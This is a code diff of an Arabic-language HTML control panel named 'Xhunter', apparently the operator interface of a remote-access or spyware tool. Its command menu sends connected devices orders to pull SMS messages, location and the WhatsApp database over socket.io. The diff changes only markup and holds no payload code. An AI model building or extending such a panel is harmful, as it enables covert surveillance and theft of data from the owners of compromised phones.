@@ -3,23 +3,25 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>لوحة التحكم Admin</title>
+<title>نظام استخبارات Xhunter</title>
 <link rel="stylesheet" href="style.css">
 </head>
 <body>
-<h1>لوحة التحكم Xhunter</h1>
+<header>
+  <h1>نظام استخبارات Xhunter</h1>
+</header>
 
-<div id="devices">
+<section id="devices">
   <h2>الأجهزة المتصلة</h2>
   <ul id="deviceList"></ul>
-</div>
+</section>
 
-<div id="events">
+<section id="logs">
   <h2>سجل الأحداث</h2>
   <ul id="logList"></ul>
-</div>
+</section>
 
-<div id="commands">
+<section id="commands">
   <h2>أوامر الأجهزة</h2>
   <select id="deviceSelect"></select>
   <select id="commandAction">
@@ -29,10 +31,11 @@
     <option value="getSMS">الرسائل</option>
     <option value="getLocation">الموقع</option>
     <option value="downloadWhatsappDatabase">واتساب</option>
+    <option value="placeholder">خدمات مستقبلية</option>
   </select>
   <input type="text" id="commandData" placeholder="بيانات JSON إذا لزم الأمر">
   <button id="sendCommand">إرسال</button>
-</div>
+</section>
 
 <script src="/socket.io/socket.io.js"></script>
 <script src="admin.js"></script>
